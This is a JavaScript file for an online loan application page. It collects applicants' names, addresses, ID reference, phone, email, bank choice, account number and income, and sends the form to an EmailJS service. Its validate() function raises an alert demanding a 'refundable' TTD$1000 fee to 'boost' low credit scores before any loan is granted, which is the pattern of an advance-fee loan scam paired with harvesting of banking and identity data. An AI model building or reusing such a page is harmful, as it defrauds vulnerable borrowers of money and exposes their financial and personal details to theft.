
let btn = document.getElementById("submit");
let terms = document.getElementById('term');
let write = document.getElementById('write');
let banks = document.getElementById('banks')
let durations = document.getElementById('durations')
let page1 = document.getElementById('page1')
let page2 = document.getElementById('page2')
let successful1 = document.getElementById('successful1')

let btn1 = document.getElementById('btn1');
let fname = document.getElementById("name")
let surname = document.getElementById("surname")
let occupation = document.getElementById("occupation")
let address = document.getElementById("address")
let province = document.getElementById("state/province")
let postal = document.getElementById("postal")
let date = document.getElementById("date")
let city = document.getElementById("city")
let pick = document.getElementById("pick")
let phone = document.getElementById("phone")
let email = document.getElementById("email")
let id = document.getElementById("reference")

let amount = document.getElementById("amount")
let duration = document.getElementById("duration")
let account = document.getElementById("account");
let bank = document.getElementById("banks");
let income = document.getElementById("income")
let yesNo = document.getElementById("yes/no");
let error = document.getElementById("error-message")
let error2 = document.getElementById("error-message2")
let form = document.getElementById("contact-form")
let agree = document.getElementById("agree")
let achecked = agree.checked
let count = 0;

let money = 1000
// let inputs = document.querySelectorAll('.input')
// console.log(input)

let option1 = document.getElementById('opt1')
let option2 = document.getElementById('opt2')
let option3 = document.getElementById('opt3')
let option4 = document.getElementById('opt4')
let option5 = document.getElementById('opt5')
let option6 = document.getElementById('opt6')
let option7 = document.getElementById('opt7')
let option8 = document.getElementById('opt8')
let option9 = document.getElementById('opt9')

let option10 = document.getElementById('opt10')
let option11 = document.getElementById('opt11')
let option12 = document.getElementById('opt12')
let option13 = document.getElementById('opt13')
let option14 = document.getElementById('opt14')
let option15 = document.getElementById('opt15')
let option16 = document.getElementById('opt16')
let option17 = document.getElementById('opt17')
let option18 = document.getElementById('opt18')
// let option19 = document.getElementById('opt19')

// const optionToName = option1;
// Set the name attribute for the option
option1.setAttribute("name", "bank");
let opt1 = option1.getAttribute("name");
option2.setAttribute("name", "bank");
let opt2 = option1.getAttribute("name");
option3.setAttribute("name", "bank");
let opt3 = option1.getAttribute("name");
option4.setAttribute("name", "bank");
let opt4 = option1.getAttribute("name");
option5.setAttribute("name", "bank");
let opt5 = option1.getAttribute("name");
option6.setAttribute("name", "bank");
let opt6 = option1.getAttribute("name");
option7.setAttribute("name", "bank");
let opt7 = option1.getAttribute("name");
option8.setAttribute("name", "bank");
let opt8 = option1.getAttribute("name");
option9.setAttribute("name", "bank");
let opt9 = option1.getAttribute("name");
console.log(opt1)

option10.setAttribute("name", "duration");
let opt10 = option10.getAttribute("name");
option11.setAttribute("name", "duration");
let opt11 = option11.getAttribute("name");
option12.setAttribute("name", "duration");
let opt12 = option12.getAttribute("name");
option13.setAttribute("name", "duration");
let opt13 = option13.getAttribute("name");
option14.setAttribute("name", "duration");
let opt14 = option14.getAttribute("name");
option15.setAttribute("name", "duration");
let opt15 = option15.getAttribute("name");
option16.setAttribute("name", "duration");
let opt16 = option16.getAttribute("name");
option17.setAttribute("name", "duration");
let opt17 = option17.getAttribute("name");
option18.setAttribute("name", "duration");
let opt18 = option18.getAttribute("name");
console.log(opt15)

setInterval(sex, 100)
function sex(){
    if(durations.value === "1 year"){
        console.log("na me dey here")
        money = 2000

    }else{
        console.log("here")
    }
}

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_hzq4x3c","template_po13moe", this)
        .then(function() {
            console.log('SUCCESS!');
            let successful = document.getElementById("successful")
            let subscribe = document.getElementById('submit')
            // console.log('na me')
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            form.style.display = 'none'
            setTimeout(sub, 400);
            function sub(){
               successful.style.display = "block"
            }
            setTimeout(hah, 800)
            function hah(){
                successful.style.display = "none"                              
                successful1.style.display = "block"                              
            }
            setTimeout(vub, 700)
            function vub(){
                subscribe.style.display = "none"
            }
        }, function(error) {
                console.log('FAILED...', error);
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                setTimeout(sub, 800);
                function sub(){
                    let writng = document.getElementById('write-up');
                    let form = document.getElementById("contact-form")
                    writng.style.display = 'inline'
                    writng.style.color = 'black'
                    form.style.display = 'none'
                    terms.style.display = 'none'
                }
            });
        });
}

myFunction();
banks.addEventListener('change', myFunction)
function myFunction(){
    let bankSelected = banks.value;
    console.log(bankSelected)
    console.log(opt1)
}

myFunction10();
banks.addEventListener('change', myFunction10)
function myFunction10(){
    let durationSeleted = durations.value;
    console.log(durationSeleted)
    console.log(opt10)
}

function validate(){
    count ++

    if(count === 1){
        alert(`Announcement 
        Note: This announcement is for clients who have low credit score, kindly be informed that clients with low credit score are required to boost their credit score to a higher level in other to be eligible for the loan amount they’re applying for. The company is willing to help boost each and everyone of you with low credit score, which is going to require a refundable fee of TTD$1000, please take note of this before agreeing to our terms and conditions, failure to do that will automatically result to loan cancellation.
        This fee is refundable for clients who might change their mind after paying and would not want to continue with the application.
       
        `)
    }else{
        alert("you didn't check it")
    }
    
    count=0
}


btn1.addEventListener("click",() => {
    
    console.log(agree.checkbox)
    if(fname.value ==="" || surname.value ==="" || occupation.value ==="" ||
    address.value ==="" || province.value === "" || postal.value ==="" || 
    date.value ==="" || city.value ==="" || phone.value ==="" || 
    id.value === ""  || email.value === ""){
        error.innerHTML = "kindly fill all the required details above";
        error.style.color = "red";
        error.style.fontSize =  "120%";
        error.style.textAlign =  "center";
        console.log("na me")
        setTimeout(sub, 2000);
        function sub(){
            error.innerHTML = ''
        }
    }else if(agree.checked == 0){
        error.innerHTML = "kindly read and agree to the terms and conditions";
        error.style.color = "red";
        error.style.fontSize =  "120%";
        error.style.textAlign =  "center";
        setTimeout(sub, 2000);
        function sub(){
            error.innerHTML = ''
        }
    } else{
        console.log("here")
        setTimeout(bub, 1000);
        function bub(){
            page1.style.display = "none";
            page2.style.display = "block";
            error.innerHTML = '';
        }
    }
})
count = 0;


setInterval(nub, 100)
function nub(){
    console.log(count)
    if(durations.value === "Select your loan duration" || account.value === "" || bank.value === "Select your bank" ||
    income.value === ""){
    error2.innerHTML = "kindly fill all the required details above";
    error2.style.color = "red";
    error2.style.fontSize =  "120%"
    error2.style.textAlign =  "center"
    console.log("na me")
    submit.style.display = 'none';
    }else{
        let submit = document.getElementById("submit")
        submit.style.display = 'block';
        error2.innerHTML = '';
       
    }
}
myFunction()

function onClickFunction2 (){
    page1.style.display = "block"
    page2.style.display = "none"
}

// let condition = document.getElementById("condition")
// condition.addEventListener("click", () =>{
//     terms.style.display = "block"
//     form.style.display = "none"
// })

function onClickFunction3(){
    form.style.display = "block"
    terms.style.display = "none"
}
